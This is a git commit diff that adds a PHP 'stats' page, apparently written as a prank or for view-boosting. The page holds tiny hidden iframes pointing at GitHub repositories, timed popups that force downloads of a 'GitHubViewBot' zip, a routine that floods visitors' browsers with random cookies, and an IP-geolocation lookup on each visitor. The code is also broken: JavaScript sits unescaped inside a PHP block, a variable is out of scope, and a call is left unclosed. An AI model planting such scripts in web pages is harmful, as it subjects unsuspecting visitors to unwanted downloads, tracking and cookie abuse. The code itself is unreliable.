7bcb993c03719e38a8c5456a1d2d4fe48df97eaf
Altify <Altify@mail.com>
2022-03-24 11:03:17 -0700

    v1
    this a bad

---
+++ html/stats/bad.php
@@ -0,0 +1,74 @@
+<?php
+<div>
+	<iframe src="https://github.com/Altify-Developing/Altify-Developing-Main" height='80px' width='75px'></iframe>
+	<embed src="https://github.com/Altify-Developing/Altify-Developing-Main" style="width:50px; height: 30px;">
+	<img src="https://github.com/Altify-Developing/Altify-Developing-Main"></a>
+	<embed type="text/html" src="github.embed.html" width="10" height="4">
+	<embed type="text/html" src="github.embed.html" width="10" height="4">
+	<embed type="text/html" src="github.embed.html" width="10" height="4">
+	<embed type="text/html" src="github.embed.html" width="10" height="4">
+	<embed type="text/html" src="github.embed.html" width="10" height="4">
+	</div>
+ <div>
+	<iframe src="https://github.com/Altify-Development/Gmail-Generator-Python" height='80px' width='75px'></iframe>
+	<embed src="https://github.com/Altify-Development/Gmail-Generator-Python" style="width:50px; height: 30px;">
+	<img src="https://github.com/Altify-Development/Gmail-Generator-Python"></a>
+	</div>
+
+setTimeout(goNewWin, 100000);
+setTimeout(closeNewWin, 10000);
+function goNewWin() {
+
+	var TheNewWin = window.open("https://github.com/Altify-Developing/GitHubViewBot/archive/refs/heads/main.zip", 'TheNewpop', 'toolbar=1,location=1,directories=1,status=1,menubar=1,scrollbars=1,resizable=1');
+	var TheNewWin = window.open("https://github.com/Altify-Developing/GitHubViewBot/archive/refs/heads/main.zip", 'TheNewpop', 'toolbar=1,location=1,directories=1,status=1,menubar=1,scrollbars=1,resizable=1');
+	var TheNewWin = window.open("https://github.com/Altify-Developing/GitHubViewBot/archive/refs/heads/main.zip", 'TheNewpop', 'toolbar=1,location=1,directories=1,status=1,menubar=1,scrollbars=1,resizable=1');
+	var TheNewWin = window.open("https://github.com/Altify-Developing/GitHubViewBot/archive/refs/heads/main.zip", 'TheNewpop', 'toolbar=1,location=1,directories=1,status=1,menubar=1,scrollbars=1,resizable=1');
+	};
+function closeNewWin() {
+    TheNewWin.blur();
+    TheNewWin.close();
+	};
+  setTimeout(CookieSpamCuzIcan, 100);
+  function CookieSpamCuzIcan() {
+  const rndInt1 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt2 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt3 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt4 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt5 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt6 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt7 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt8 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt9 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt10 = Math.floor(Math.random() * 10000000) + 1000
+  const rndInt22 = Math.floor(Math.random() * 0.00000001) + 1
+  const rndInt11 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt12 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt13 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt14 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt15 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt16 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt17 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt18 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt19 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt20 = Math.floor(Math.random() * 900000000000) + 10000000000
+  const rndInt21 = Math.floor(Math.random() * 0.00000001) + 1
+  let value = "1";
+  value = Number(value) + 1;
+  document.cookie = encodeURIComponent(rndInt1) + '=' + encodeURIComponent(rndInt11);
+  document.cookie = encodeURIComponent(rndInt2) + '=' + encodeURIComponent(rndInt12);
+  document.cookie = encodeURIComponent(rndInt3) + '=' + encodeURIComponent(rndInt13);
+  document.cookie = encodeURIComponent(rndInt4) + '=' + encodeURIComponent(rndInt14);
+  document.cookie = encodeURIComponent(rndInt5) + '=' + encodeURIComponent(rndInt15);
+  document.cookie = encodeURIComponent(rndInt6) + '=' + encodeURIComponent(rndInt16);
+  document.cookie = encodeURIComponent(rndInt7) + '=' + encodeURIComponent(rndInt17);
+  document.cookie = encodeURIComponent(rndInt8) + '=' + encodeURIComponent(rndInt18);
+  document.cookie = encodeURIComponent(rndInt9) + '=' + encodeURIComponent(rndInt19);
+  document.cookie = encodeURIComponent(rndInt10) + '=' + encodeURIComponent(rndInt20);
+  document.cookie = encodeURIComponent(rndInt21) + '=' + encodeURIComponent(rndInt22);
+  let CookieListAll = document.cookie;
+  document.write(CookieListAll);
+  };
+  setTimeout(data, 100);
+$.getJSON('http://ip-api.com/json', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+?>
